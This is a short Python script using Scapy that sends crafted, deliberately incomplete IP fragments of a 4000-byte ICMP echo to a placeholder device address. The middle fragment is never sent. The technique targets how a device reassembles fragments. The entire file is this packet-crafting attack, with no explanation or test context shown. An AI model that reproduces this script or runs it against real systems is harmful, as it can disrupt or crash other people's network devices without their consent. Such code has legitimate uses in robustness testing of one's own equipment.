from scapy.all import *

target = "Device IP Goes Here" 
id_val = 12345
payload = b"A" * 4000

frag1 = payload[:1480]
frag3 = payload[2960:]

ip1 = IP(dst=target, id=id_val, flags="MF")
icmp = ICMP(type=8)  
pkt1 = ip1 / icmp / Raw(load=frag1)

ip3 = IP(dst=target, id=id_val, frag=370)
pkt3 = ip3 / Raw(load=frag3)

send(pkt1)
send(pkt3)


